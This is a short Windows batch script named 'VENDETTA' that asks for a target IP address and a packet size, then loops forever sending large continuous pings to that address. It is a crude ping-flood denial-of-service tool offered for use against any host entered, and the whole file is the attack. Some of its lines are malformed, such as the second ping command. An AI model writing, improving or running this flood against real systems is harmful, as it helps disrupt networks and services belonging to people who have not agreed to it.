@echo off
color 4

title VENDETTA

:greeting
cls

echo W E L C O M E 
echo - - TO  - -
echo -M O R T A L-
                                                                                                                                                                                                                                                                                                                                                               
set /p IP=Enter IP=
:top
set /p bytes=enter ammount of bytes here(max 65001)=
cls
ping %ip% -t -l %bytes%
cls
IF ERRORLEVEL 1 (SET in=0b & echo IP not responding.) 
color %in%
ping -t 2 0 10 127.0.0.1 >nul
GoTo top 